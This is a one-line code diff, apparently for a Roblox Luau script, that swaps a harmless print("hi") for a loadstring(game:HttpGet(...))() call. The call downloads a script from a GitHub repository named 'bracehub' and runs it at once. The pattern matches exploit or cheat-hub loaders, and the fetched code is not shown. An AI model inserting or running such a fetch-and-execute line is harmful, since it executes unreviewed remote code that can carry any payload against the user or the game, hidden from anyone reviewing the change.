@@ -1,1 +1,1 @@
-print("hi")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/noicyreal/bracehub/refs/heads/main/one.luau"))()
